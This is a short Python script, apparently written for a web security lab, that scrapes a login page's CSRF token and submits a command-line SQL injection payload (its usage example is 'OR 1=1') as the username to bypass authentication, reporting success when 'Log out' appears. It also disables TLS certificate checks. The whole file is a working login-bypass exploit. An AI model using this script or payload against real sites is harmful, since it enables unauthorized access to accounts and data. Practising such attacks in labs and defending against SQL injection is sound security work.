import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf(url, s):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    print(csrf)
    return csrf

def exploit(s, url, payload):
    csrf = get_csrf(url, s)
    data = {
        "csrf": csrf,
        "username": payload,
        "password": "pass"
    }
    
    r = s.post(url, data=data, verify=False)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

def main():
    if len(sys.argv) != 3:
        print("(!) Usage: %s <url> <payload>" % sys.argv[0])
        print("(!) Example: %s www.example.com 'OR 1=1'" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1].strip()
    payload = sys.argv[2].strip()
    
    if exploit(s, url, payload):
        print("Exploit successful")
    else:
        print("Exploit failed")

if __name__ == '__main__':
    main()